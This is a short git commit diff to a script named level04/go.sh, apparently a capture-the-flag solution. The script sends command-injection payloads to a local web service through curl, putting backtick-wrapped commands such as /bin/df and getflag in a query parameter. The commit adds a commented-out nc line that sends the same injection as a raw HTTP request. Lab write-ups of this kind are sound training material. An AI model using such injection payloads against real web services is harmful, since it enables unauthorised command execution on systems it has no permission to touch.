bde528c61d3fab76eaf495283d6401995bf65fa7
nuo <49533950+nuoxoxo@users.noreply.github.com>
2024-11-19 12:41:52 +0100

    4/runner

--- level04/go.sh
+++ level04/go.sh
@@ -8,5 +8,6 @@ curl localhost:4747/?x="\`/bin/df\`"
 curl localhost:4747/?x="\`$(which pwd)\`" 🟢 
 
 # solve
+#echo -e "GET /?x=\`$(which getflag)\` HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc localhost 4747
 curl localhost:4747/?x="\`$(which getflag)\`"
 
